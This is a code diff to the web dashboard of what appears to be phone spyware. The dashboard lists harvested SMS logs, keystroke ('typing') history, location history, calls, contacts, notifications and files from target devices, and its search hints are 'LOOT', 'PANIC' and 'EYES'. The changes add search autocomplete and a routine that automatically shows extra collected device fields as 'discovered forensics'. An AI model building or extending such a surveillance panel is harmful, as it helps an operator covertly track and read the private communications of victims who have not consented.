@@ -37,15 +37,17 @@
         }
 
         header {
-            background: rgba(5, 5, 5, 0.9);
-            backdrop-filter: blur(10px);
+            background: rgba(5, 5, 5, 0.95);
+            backdrop-filter: blur(15px);
             padding: 15px;
             border-bottom: 1px solid var(--primary);
             display: flex;
             justify-content: space-between;
             align-items: center;
-            z-index: 10;
+            z-index: 1000;
             box-shadow: 0 0 15px rgba(0, 243, 255, 0.2);
+            position: sticky;
+            top: 0;
         }
 
         .logo { font-size: 1.2rem; color: var(--primary); text-shadow: 0 0 5px var(--primary); letter-spacing: 2px; }
@@ -164,7 +166,11 @@
             <div id="connectionStatus" class="status-dot"></div>
         </div>
         <div id="search-bar">
-            <input type="text" id="search-input" placeholder="ENTER KEYWORD (e.g. LOOT, PANIC, EYES)..." onkeyup="if(event.key==='Enter') executeSearch()">
+            <div style="display:flex; gap:5px;">
+                <input type="text" id="search-input" list="search-suggestions" placeholder="ENTER KEYWORD (e.g. LOOT, PANIC, EYES)..." onkeyup="if(event.key==='Enter') executeSearch()">
+                <button class="btn" onclick="toggleSearch()" style="padding:5px 10px; font-size:0.7rem;">X</button>
+            </div>
+            <datalist id="search-suggestions"></datalist>
         </div>
     </header>
 
@@ -390,7 +396,17 @@
             await fetchLatest();
             setInterval(fetchLatest, 5000);
             fetchFiles(); // Initial load
+            initSearchSuggestions();
         };
+
+        function initSearchSuggestions() {
+            const datalist = document.getElementById('search-suggestions');
+            const keywords = new Set();
+            document.querySelectorAll('h2[data-search]').forEach(h => {
+                h.getAttribute('data-search').split(',').forEach(k => keywords.add(k.trim()));
+            });
+            datalist.innerHTML = Array.from(keywords).sort().map(k => `<option value="${k}">`).join('');
+        }
 
         function switchTab(tab) {
             document.querySelectorAll('.section').forEach(el => el.classList.remove('active'));
@@ -628,12 +644,23 @@
                                 fullData = s.location_fresh ? [s.location_fresh, ...history] : history;
                             } else if (mod === 'vitals') {
                                 preview = `🔋${s.battery_level}% | ⏱️${s.online_time_minutes}m | 🔄${s.online_sessions}`;
+                                
+                                // DYNAMIC DISCOVERY: Capture all top-level columns automatically
+                                const discovery = {};
+                                const knownKeys = ['id', 'created_at', 'device_id', 'device_model', 'fcm_token', 'summary_stats', 'app_health', 'sms_logs', 'location_history', 'typing_history', 'notif_history', 'calls', 'contacts', 'apps', 'file_skeleton', 'historical_sms', 'network_logs'];
+                                Object.entries(s).forEach(([k, v]) => {
+                                    if (!knownKeys.includes(k) && v !== null && typeof v !== 'object') {
+                                        discovery[k] = v;
+                                    }
+                                });
+
                                 fullData = { 
                                     metrics: { 
                                         battery: s.battery_level + "%", 
                                         online_total: s.online_time_minutes + "m", 
                                         sessions: s.online_sessions 
                                     },
+                                    discovered_forensics: discovery,
                                     summary: s.summary_stats,
                                     health: s.app_health 
                                 };
@@ -688,6 +715,15 @@
                                                         <span>${v}</span>
                                                     </div>
                                                 `).join('')}
+                                                ${Object.keys(fullData.discovered_forensics || {}).length > 0 ? `
+                                                    <div style="margin:10px 0; color:var(--primary); border-bottom:1px solid var(--primary); padding-bottom:4px;">DISCOVERED COLUMNS</div>
+                                                    ${Object.entries(fullData.discovered_forensics).map(([k, v]) => `
+                                                        <div style="display:flex; justify-content:space-between; margin-bottom:4px;">
+                                                            <span style="color:#666">${k.toUpperCase()}</span>
+                                                            <span style="color:var(--primary)">${v}</span>
+                                                        </div>
+                                                    `).join('')}
+                                                ` : ''}
                                                 <div style="margin:10px 0; color:#888; border-bottom:1px solid #222; padding-bottom:4px;">RAW DIAGNOSTICS</div>
                                                 <pre style="margin:0; font-size:0.55rem; color:#444; white-space:pre-wrap;">${JSON.stringify(fullData.health || fullData.app_health || fullData, null, 2)}</pre>
                                             </div>
